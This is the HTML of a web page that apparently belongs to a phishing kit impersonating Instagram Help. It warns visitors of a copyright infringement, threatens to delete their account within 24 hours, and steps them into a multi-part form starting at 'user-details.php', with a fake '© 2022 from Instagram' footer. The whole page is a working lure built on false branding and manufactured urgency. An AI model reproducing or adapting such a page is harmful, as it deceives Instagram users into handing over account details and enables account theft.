
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="author" content="Yusuf ÇELİK ">
    <!-- Primary Meta Tags -->
<title> Instagram Help copyright notice</title>
<meta name="title" content=" Instagram Help copyright notice">
<meta name="description" content="Instagram Help copyright notice.
İnstagram Yardım telif hakkı uyarısı.
Hesabınız silinebilir .">

<!-- Open Graph / Facebook -->
<meta property="og:type" content="website">
<meta property="og:url" content="http://panelrozetinstagramrozet.42web.io/">
<meta property="og:title" content=" Instagram Help copyright notice">
<meta property="og:description" content="Instagram Help copyright notice.
İnstagram Yardım telif hakkı uyarısı.
Hesabınız silinebilir .">
<meta property="og:image" content="">

<!-- Twitter -->
<meta property="twitter:card" content="summary_large_image">
<meta property="twitter:url" content="http://panelrozetinstagramrozet.42web.io/">
<meta property="twitter:title" content=" Instagram Help copyright notice">
<meta property="twitter:description" content="Instagram Help copyright notice.
İnstagram Yardım telif hakkı uyarısı.
Hesabınız silinebilir .">
<meta property="twitter:image" content="">
    <link rel="icon" href="panel/img/head.ico">
    <title>Copyright | İnfringement</title>
    <link href="panel/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="panel/zew/css/style.css" rel="stylesheet">
</head>
<header>
		<br>
	<img style="
  display: block;
  margin-left: auto;
  margin-right: auto;
  margin-top:1.3%;
  "
  src="panel/img/head.gif" width="200px">

	</header>
	<br>
<body>



<div class="row">
    <div class="col-md-6 col-md-offset-3">
        <form id="zewform">
    
            <ul id="progressbar">
                <li class="active">İnformation</li>
                <li>User Details</li>
                <li>Copyright Reason</li>
                <li>form Status</li>          
            </ul>

            <fieldset>
			  <h2 class="fs-title">information</h2>	  
                <h3 class="information">Dear user, this form is sent once to every copyright infringing user, enter carefully following our data policies, incorrect information will be canceled and the account will be deleted within <font color="#ff0000" size="2" >24-hours.</font> In addition, your necessary information will be given to the copyright owner as per our contract.</h3>
				
                <a href="user-details.php" class="btn  action-button" role="button" aria-pressed="true">Next</a>

                </fieldset>
             
    </div>
</div>

 
<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js'></script>

<script src="panel/bootstrap/js/bootstrap.min.js"></script>
<script src="panel/zew/js/zewform.js"></script>
<br><br><br><br>
<div class="footer">
  <p>© 2022 from Instagram</p>
</div>
</body>

</html>
